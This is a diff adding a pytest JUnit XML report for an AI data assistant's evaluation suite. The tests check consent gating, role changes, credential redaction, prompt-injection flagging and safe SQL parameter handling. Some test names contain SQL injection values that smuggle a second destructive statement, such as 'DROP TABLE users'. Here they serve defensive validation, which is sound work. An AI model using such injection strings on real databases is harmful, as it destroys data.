@@ -1,0 +1,610 @@
+<?xml version='1.0' encoding='utf-8'?>
+<testsuites name="pytest tests">
+  <testsuite name="pytest" errors="0" failures="0" skipped="0" tests="605" time="14.444">
+    <testcase classname="tests.eval.test_agent_coordination_checkpoint" name="test_child_coordination_message_arrives_before_next_model_call" time="0.005" />
+    <testcase classname="tests.eval.test_agent_memory" name="test_business_rule_survives_new_thread_and_is_corrected" time="0.002" />
+    <testcase classname="tests.eval.test_agent_memory" name="test_memory_isolation_and_untrusted_extraction" time="0.001" />
+    <testcase classname="tests.eval.test_agent_memory" name="test_repository_enforces_all_scope_fields_in_sql" time="0.001" />
+    <testcase classname="tests.eval.test_agent_memory" name="test_credentials_never_enter_extraction" time="0.001" />
+    <testcase classname="tests.eval.test_agent_memory" name="test_retrieval_selects_business_rule_among_distractors" time="0.001" />
+    <testcase classname="tests.eval.test_agent_memory" name="test_memory_endpoint_paginates_with_scope" time="0.002" />
+    <testcase classname="tests.eval.test_assistant_consent_budget" name="test_approval_wait_preserves_execution_budget[False]" time="0.002" />
+    <testcase classname="tests.eval.test_assistant_consent_budget" name="test_approval_wait_preserves_execution_budget[True]" time="0.105" />
+    <testcase classname="tests.eval.test_assistant_consent_budget" name="test_abandoned_approval_has_its_own_bound" time="0.002" />
+    <testcase classname="tests.eval.test_assistant_consent_budget" name="test_capability_help_cannot_execute_database_query" time="0.025" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_role_change_requires_separate_approval[USE ROLE marketing]" time="0.018" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_role_change_requires_separate_approval[SET ROLE 'marketing']" time="0.001" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_role_change_requires_separate_approval[/* role */ USE ROLE `marketing`;]" time="0.000" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_invalid_role_changes_remain_denied[SET ROLE ALL]" time="0.000" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_invalid_role_changes_remain_denied[SET ROLE NONE]" time="0.000" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_invalid_role_changes_remain_denied[USE ROLE finance,marketing]" time="0.000" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_invalid_role_changes_remain_denied[USE ROLE marketing; SELECT 1]" time="0.000" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_invalid_role_changes_remain_denied[USE ROLE marketing; DROP TABLE x]" time="0.000" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_invalid_role_changes_remain_denied[SET ROLE marketing garbage]" time="0.000" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_invalid_role_changes_remain_denied[SET sql_mode = 'x']" time="0.000" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_role_switch_trajectory[True-True]" time="0.153" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_role_switch_trajectory[False-True]" time="0.004" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_role_switch_trajectory[True-False]" time="0.005" />
+    <testcase classname="tests.eval.test_assistant_role_switch" name="test_neva_relists_readable_views_for_the_new_role" time="0.007" />
+    <testcase classname="tests.eval.test_automation_action_trajectory" name="test_automation_trajectory_requires_fresh_consent[True]" time="0.142" />
+    <testcase classname="tests.eval.test_automation_action_trajectory" name="test_automation_trajectory_requires_fresh_consent[False]" time="0.081" />
+    <testcase classname="tests.eval.test_automation_action_trajectory" name="test_automation_trajectory_requires_fresh_consent[None]" time="0.083" />
+    <testcase classname="tests.eval.test_automation_action_trajectory" name="test_uncertain_automation_trajectory_never_redispatches" time="0.117" />
+    <testcase classname="tests.eval.test_bound_agent_chart_route" name="test_bound_model_chart_uses_semantic_query_before_chart" time="0.005" />
+    <testcase classname="tests.eval.test_business_action_trajectory" name="test_action_trajectory_requires_per_call_consent_even_with_read_grant[True]" time="0.004" />
+    <testcase classname="tests.eval.test_business_action_trajectory" name="test_action_trajectory_requires_per_call_consent_even_with_read_grant[False]" time="0.006" />
+    <testcase classname="tests.eval.test_business_action_trajectory" name="test_action_trajectory_requires_per_call_consent_even_with_read_grant[None]" time="0.005" />
+    <testcase classname="tests.eval.test_business_action_trajectory" name="test_action_failure_trajectory_stops_without_claiming_success[uncertain_dispatch]" time="0.094" />
+    <testcase classname="tests.eval.test_business_action_trajectory" name="test_action_failure_trajectory_stops_without_claiming_success[policy_revoked]" time="0.079" />
+    <testcase classname="tests.eval.test_business_ontology_trajectory" name="test_a_term_with_two_definitions_finishes_as_a_question_back" time="0.023" />
+    <testcase classname="tests.eval.test_business_ontology_trajectory" name="test_an_unbound_concept_is_not_answered_with_a_similar_metric" time="0.010" />
+    <testcase classname="tests.eval.test_business_ontology_trajectory" name="test_a_grounded_question_is_answered_with_the_official_metric" time="0.279" />
+    <testcase classname="tests.eval.test_business_ontology_trajectory" name="test_a_word_describing_the_asked_metric_does_not_block_the_answer" time="0.072" />
+    <testcase classname="tests.eval.test_business_ontology_trajectory" name="test_a_second_metric_the_question_asks_for_is_still_required" time="0.029" />
+    <testcase classname="tests.eval.test_business_ontology_trajectory" name="test_the_explain_tool_stays_behind_consent" time="0.011" />
+    <testcase classname="tests.eval.test_business_ontology_trajectory" name="test_a_users_correction_is_filed_for_review_behind_consent" time="0.012" />
+    <testcase classname="tests.eval.test_catalog_metadata_trajectory" name="test_studio_finds_a_tagged_column_only_within_the_callers_role" time="0.016" />
+    <testcase classname="tests.eval.test_catalog_metadata_trajectory" name="test_a_session_without_an_active_role_reads_no_metadata" time="0.001" />
+    <testcase classname="tests.eval.test_chart_data_provenance" name="test_chart_turn_keeps_all_verified_rows_and_finishes" time="0.003" />
+    <testcase classname="tests.eval.test_city_rbac_empty_answer" name="test_city_rbac_empty_result_overrides_unsupported_number" time="0.007" />
+    <testcase classname="tests.eval.test_configured_execution_timezone" name="test_configured_utc_semantic_turn_uses_injected_clock" time="0.046" />
+    <testcase classname="tests.eval.test_consent_proposal_identity" name="test_a_previous_decision_cannot_resolve_a_later_provider_id_reuse" time="0.006" />
+    <testcase classname="tests.eval.test_consent_proposal_identity" name="test_parallel_turns_with_the_same_wire_id_keep_independent_approvals" time="0.007" />
+    <testcase classname="tests.eval.test_consent_proposal_identity" name="test_prefetched_calls_with_reused_wire_ids_run_once_and_keep_public_identity" time="0.003" />
+    <testcase classname="tests.eval.test_consent_proposal_identity" name="test_reused_response_object_gets_a_new_identity_without_repeating_its_effect" time="0.003" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_custom_sql_tool_dispatches_supported_sql_with_caller_context[INSERT INTO t (value) VALUES ({{value}})]" time="0.002" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_custom_sql_tool_dispatches_supported_sql_with_caller_context[SELECT value FROM t WHERE value = {{value}}]" time="0.001" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_custom_sql_tool_dispatches_supported_sql_with_caller_context[UPDATE t SET value = {{value}} WHERE id = 1]" time="0.001" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_custom_sql_tool_dispatches_supported_sql_with_caller_context[DELETE FROM t WHERE value = {{value}}]" time="0.001" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_custom_sql_tool_dispatches_supported_sql_with_caller_context[SELECT * FROM @stage1.data.csv WHERE value = {{value}}]" time="0.001" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_custom_sql_tool_dispatches_supported_sql_with_caller_context[INSERT INTO t SELECT * FROM @stage1.data.csv WHERE value = {{value}}]" time="0.001" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_insert_then_select_tools_run_in_one_agent_turn" time="0.004" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_denied_write_never_reaches_query_service" time="0.002" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_stage_export_custom_tool_requires_consent_and_reaches_pipeline" time="0.003" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_default_guard_and_query_tool_still_block_stage_exports" time="0.001" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_identifier_parameter_cannot_downgrade_stage_export_consent" time="0.001" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_stage_export_permission_does_not_bypass_accountadmin_guard" time="0.001" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_function_parameters_are_rendered_in_advertised_order" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_function_legacy_args_and_missing_argument" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_typed_parameters_render_as_safe_sql[integer-7-7]" time="0.001" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_typed_parameters_render_as_safe_sql[int--7--7]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_typed_parameters_render_as_safe_sql[number-1.25-1.25]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_typed_parameters_render_as_safe_sql[float-1.25-1.25]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_typed_parameters_render_as_safe_sql[boolean-True-TRUE]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_typed_parameters_render_as_safe_sql[boolean-False-FALSE]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_typed_parameters_render_as_safe_sql[array-value6-[1, 'O''Brien', FALSE, NULL]]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_typed_parameters_render_as_safe_sql[identifier-safe_table-safe_table]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_invalid_typed_parameters_return_tool_errors[integer-True]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_invalid_typed_parameters_return_tool_errors[integer-7; DROP TABLE t]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_invalid_typed_parameters_return_tool_errors[number-1; DROP TABLE t]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_invalid_typed_parameters_return_tool_errors[number-nan]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_invalid_typed_parameters_return_tool_errors[number-inf]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_invalid_typed_parameters_return_tool_errors[boolean-true]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_invalid_typed_parameters_return_tool_errors[array-value6]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_invalid_typed_parameters_return_tool_errors[array-value7]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_invalid_typed_parameters_return_tool_errors[identifier-t; DROP TABLE users]" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_optional_parameter_is_null_when_omitted" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_preview_hides_credential_shaped_arguments" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_result_mode_redacts_secret_columns_and_credential_values" time="0.002" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_parameter_value_cannot_add_a_second_statement" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_invalid_identifier_argument_returns_a_tool_error" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_comment_placeholder_is_not_required_or_substituted" time="0.000" />
+    <testcase classname="tests.eval.test_custom_sql_tools_trajectory" name="test_partial_failure_does_not_report_success" time="0.001" />
+    <testcase classname="tests.eval.test_dashboard_build_trajectory" name="test_dashboard_build_creates_artifacts_and_a_dashboard_frame" time="0.005" />
+    <testcase classname="tests.eval.test_dashboard_build_trajectory" name="test_dashboard_build_needs_the_turns_verified_data" time="0.001" />
+    <testcase classname="tests.eval.test_data_window_trajectory" name="test_a_period_that_has_not_started_is_answered_without_a_query" time="0.013" />
+    <testcase classname="tests.eval.test_data_window_trajectory" name="test_a_past_period_outside_the_data_names_the_covered_range" time="0.055" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_an_unsupported_map_is_explained_and_nothing_is_planned" time="0.008" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_a_supported_result_is_applied_once_only_after_consent[True]" time="0.004" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_a_supported_result_is_applied_once_only_after_consent[False]" time="0.004" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_a_dashboard_answer_satisfies_the_governed_data_requirement" time="0.009" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_context_the_server_already_gave_settles_its_tool[settled0]" time="0.001" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_context_the_server_already_gave_settles_its_tool[settled1]" time="0.001" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_on_an_open_dashboard_its_own_query_answers_a_ranking" time="0.004" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_lineage_is_answered_from_verified_dashboard_metadata[True]" time="0.003" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_lineage_is_answered_from_verified_dashboard_metadata[False]" time="0.002" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_a_mislabelled_dashboard_question_still_reaches_its_data" time="0.002" />
+    <testcase classname="tests.eval.test_dataviz_trajectory" name="test_a_yes_in_the_next_turn_applies_the_prepared_change" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_creates_semantic_view_after_approval]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_semantic_view_creation_help_does_not_require_query]" time="0.042" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_explains_ai_search_without_querying_data]" time="0.028" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_tool_result_cannot_overflow_next_provider_call]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_concept_needs_no_database]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_sql_authoring_needs_no_execution]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_schema_then_data_query]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_diagnosis_can_retrieve_documentation]" time="0.027" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_documentation_cannot_replace_data_evidence]" time="0.013" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_entity_search_falls_back_to_authorized_query]" time="0.003" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_runs_a_notebook_cell_after_approval]" time="0.003" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_does_not_run_a_cell_the_person_declined]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[neva_explains_a_notebook_error_without_running_anything]" time="0.015" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[qualitative_data_claim_requires_execution]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[missing_capability_refuses_answer]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[disabled_chart_tool_gives_actionable_error]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[delegates_to_query_execute]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[surface_filter_avoids_planner]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[numeric_claim_matches_query_result]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[unsupported_numeric_claim_is_withheld]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[change_diagnosis_reconciles_after_data]" time="0.004" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[external_mcp_requires_explicit_consent]" time="0.005" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[web_search_cites_public_sources]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[studio_text_attachment_answers_without_tools]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[studio_attachment_math_stays_with_document]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[studio_image_attachment_reaches_vision_turn]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[pure_answer_no_tool]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[destructive_tool_prompts]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[role_access_requires_consent]" time="0.004" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[denied_call_continues]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[failed_tool_terminates]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[recoverable_semantic_error_repairs_once]" time="0.003" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[read_only_grant_auto_approves]" time="0.004" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[ai_search_bounded_consent]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[semantic_view_query_consent]" time="0.003" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[feature_lookup_consent]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[prompted_call_is_announced_as_pending]" time="0.003" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[trace_is_recorded_for_replay]" time="0.006" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[skill_body_stays_out_of_transcript]" time="0.021" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[observability_spans_are_recorded]" time="0.005" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[no_grant_prompts_every_call]" time="0.004" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[iteration_cap]" time="0.004" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[time_budget]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[credential_arguments_redacted]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[duplicate_call_not_rerun]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[context_is_curated]" time="0.003" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[context_overflow_stops_cleanly]" time="0.001" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[text_precedes_result_artifact]" time="0.003" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[artifact_can_precede_later_text]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[follow_up_chart_reuses_previous_table]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[generated_sql_visible_during_tool_run]" time="0.003" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[multiple_tool_calls_are_serialized]" time="0.003" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[harness_guard_blocks_before_consent]" time="0.002" />
+    <testcase classname="tests.eval.test_eval_scenarios" name="test_scenario[credential_shape_redacted_from_answer]" time="0.002" />
+    <testcase classname="tests.eval.test_evidence_health_trajectory" name="test_governed_health_survives_loop_replay_without_extra_model_call[False-moderate]" time="0.127" />
+    <testcase classname="tests.eval.test_evidence_health_trajectory" name="test_governed_health_survives_loop_replay_without_extra_model_call[True-limited]" time="0.075" />
+    <testcase classname="tests.eval.test_external_content_is_not_evidence" name="test_external_text_is_marked_untrusted_and_cited" time="0.002" />
+    <testcase classname="tests.eval.test_external_content_is_not_evidence" name="test_a_web_result_cannot_answer_a_business_metric_question" time="0.004" />
+    <testcase classname="tests.eval.test_harness_guards_trajectory" name="test_agent_rule_blocks_a_call_before_consent_and_the_model_recovers" time="0.004" />
+    <testcase classname="tests.eval.test_harness_guards_trajectory" name="test_repeated_blocked_calls_exhaust_the_tool_budget" time="0.002" />
+    <testcase classname="tests.eval.test_harness_guards_trajectory" name="test_error_hint_is_appended_to_the_failed_call" time="0.003" />
+    <testcase classname="tests.eval.test_harness_guards_trajectory" name="test_instructions_inside_result_rows_are_flagged_not_followed" time="0.003" />
+    <testcase classname="tests.eval.test_harness_guards_trajectory" name="test_ordinary_business_text_is_not_flagged" time="0.004" />
+    <testcase classname="tests.eval.test_harness_guards_trajectory" name="test_a_credential_shape_never_reaches_the_answer" time="0.002" />
+    <testcase classname="tests.eval.test_harness_guards_trajectory" name="test_a_required_tool_refused_by_a_guard_ends_with_the_rule_not_a_failure" time="0.002" />
+    <testcase classname="tests.eval.test_intelligence_causal_boundary" name="test_post_outcome_selection_stops_before_query_and_success_claim" time="0.003" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_provider_outage_preserves_pending_source_then_retry_completes_once" time="0.004" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_malformed_provider_reply_remains_pending_and_can_resume[not JSON]" time="0.006" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_malformed_provider_reply_remains_pending_and_can_resume[{&quot;facts&quot;: []}]" time="0.003" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_malformed_provider_reply_remains_pending_and_can_resume[[null]]" time="0.004" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_consolidation_rejects_changed_identity_before_model_or_source_access[changed0]" time="0.002" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_consolidation_rejects_changed_identity_before_model_or_source_access[changed1]" time="0.002" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_consolidation_rejects_changed_identity_before_model_or_source_access[changed2]" time="0.003" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_consolidation_rejects_changed_identity_before_model_or_source_access[changed3]" time="0.003" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_source_context_mismatch_never_becomes_completed_work" time="0.002" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_learning_records_public_usage_and_unknown_cost_before_completion" time="0.004" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_learning_journal_failure_prevents_provider_call" time="0.004" />
+    <testcase classname="tests.eval.test_intelligence_learning_work" name="test_context_change_during_extraction_preserves_usage_but_cannot_promote" time="0.004" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_simulation_prose_and_ui_share_checked_values[False]" time="0.144" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_simulation_prose_and_ui_share_checked_values[True]" time="0.105" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_interactive_answers_use_the_verified_final_composer[interactive]" time="0.120" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_interactive_answers_use_the_verified_final_composer[text]" time="0.112" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_interactive_answers_use_the_verified_final_composer[None]" time="0.118" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_a_turn_without_intelligent_ui_gets_no_ui_catalog" time="0.002" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_default_ui_keeps_plain_answers_in_one_provider_call" time="0.001" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_optional_ui_still_repairs_invalid_or_unclosed_programs[root=Col([Unknown(&quot;x&quot;)])]" time="0.210" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_optional_ui_still_repairs_invalid_or_unclosed_programs[root=Col([Text(&quot;unfinished&quot;)])]" time="0.147" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_missing_requested_controls_can_repair_within_the_same_loop[Your calculator is below.]" time="0.111" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_missing_requested_controls_can_repair_within_the_same_loop[Assumptions.\n```openui\n$a=5\n$total=@Sum([$a,2])\nroot=Col([Text($total)])\n```]" time="0.204" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_invalid_ui_repairs_once_then_publishes_nonempty_text[Useful text fallback, but the requested controls were omitted.]" time="0.002" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_invalid_ui_repairs_once_then_publishes_nonempty_text[Useful text fallback.\n```openui\nroot = Col([Unknown(&quot;x&quot;)])\n```]" time="0.193" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_invalid_ui_repairs_once_then_publishes_nonempty_text[```openui\nroot = Col([Title(&quot;Assumptions calculator&quot;), Slider($units,&quot;Units&quot;,1,100),Text(&quot;Total: &quot;+($units*20)),Button(&quot;Continue&quot;,@ToAssistant(&quot;Use these assumptions&quot;),&quot;continue&quot;)])\n$units=5\n```]" time="0.003" />
+    <testcase classname="tests.eval.test_intelligent_ui_trajectory" name="test_composing_again_after_a_number_rewrite_sends_the_composer_once" time="0.135" />
+    <testcase classname="tests.eval.test_iterative_analysis_trajectory" name="test_analyst_drills_down_and_computes_after_the_required_query" time="0.011" />
+    <testcase classname="tests.eval.test_iterative_analysis_trajectory" name="test_non_iterative_loop_still_composes_after_the_required_query" time="0.030" />
+    <testcase classname="tests.eval.test_iterative_analysis_trajectory" name="test_budget_reserve_forces_the_answer_before_the_cap" time="0.007" />
+    <testcase classname="tests.eval.test_iterative_analysis_trajectory" name="test_separate_repair_budgets_survive_two_different_slips" time="0.004" />
+    <testcase classname="tests.eval.test_iterative_analysis_trajectory" name="test_one_declined_approval_is_reported_back_to_the_model" time="0.002" />
+    <testcase classname="tests.eval.test_iterative_analysis_trajectory" name="test_a_second_denial_ends_the_turn" time="0.001" />
+    <testcase classname="tests.eval.test_iterative_analysis_trajectory" name="test_the_declined_call_is_never_asked_again" time="0.001" />
+    <testcase classname="tests.eval.test_iterative_analysis_trajectory" name="test_non_iterative_loop_still_ends_on_the_first_denial" time="0.001" />
+    <testcase classname="tests.eval.test_iterative_analysis_trajectory" name="test_a_failed_optional_step_does_not_discard_the_required_evidence" time="0.005" />
+    <testcase classname="tests.eval.test_mcp_consent_trajectory" name="test_immediate_mcp_decision_is_scoped_and_precedes_external_effect[allow_once]" time="0.016" />
+    <testcase classname="tests.eval.test_mcp_consent_trajectory" name="test_immediate_mcp_decision_is_scoped_and_precedes_external_effect[deny]" time="0.010" />
+    <testcase classname="tests.eval.test_mixed_tool_stream" name="test_mixed_stream_executes_required_query_before_answering" time="0.004" />
+    <testcase classname="tests.eval.test_ml_tool_arguments" name="test_task_schemas_preserve_runtime_inputs" time="0.001" />
+    <testcase classname="tests.eval.test_ml_tool_arguments" name="test_semantic_clustering_accepts_row_identifier_after_skill_load" time="0.006" />
+    <testcase classname="tests.eval.test_ml_tool_arguments" name="test_a_forecast_may_name_a_governed_result_instead_of_a_query" time="0.000" />
+    <testcase classname="tests.eval.test_ml_tool_arguments" name="test_the_ml_tool_runs_on_the_compiled_query_of_a_result_this_turn_holds" time="0.001" />
+    <testcase classname="tests.eval.test_ml_tool_arguments" name="test_a_query_the_engine_rejects_can_be_replaced" time="0.001" />
+    <testcase classname="tests.eval.test_multilingual_primary_plan" name="test_japanese_top_three_runs_the_planned_query_and_answers_once" time="0.042" />
+    <testcase classname="tests.eval.test_neva_cancellation" name="test_cancel_during_silent_tool_releases_task" time="0.104" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_a_failed_lookup_is_corrected_once" time="0.005" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_a_lookup_that_keeps_failing_ends_in_plain_words" time="0.004" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_an_access_refusal_is_never_retried[Access denied for user alice]" time="0.003" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_an_access_refusal_is_never_retried[permission denied]" time="0.002" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_an_access_refusal_is_never_retried[Missing privilege SELECT]" time="0.001" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_studio_agents_keep_their_failure_contract" time="0.001" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_neva_does_not_guess_a_view" time="0.001" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_a_named_view_is_used" time="0.002" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_a_studio_agent_keeps_its_first_view" time="0.001" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_neva_sees_the_views_it_can_name" time="0.001" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_neva_checks_the_sql_its_draft_proposes" time="0.002" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_neva_looks_up_the_guide_the_model_skipped" time="0.002" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_a_draft_without_sql_has_nothing_to_check" time="0.001" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_studio_agents_still_stop_when_a_check_is_skipped" time="0.001" />
+    <testcase classname="tests.eval.test_neva_lookups_and_views" name="test_a_quick_turn_gets_the_smaller_ceiling" time="0.020" />
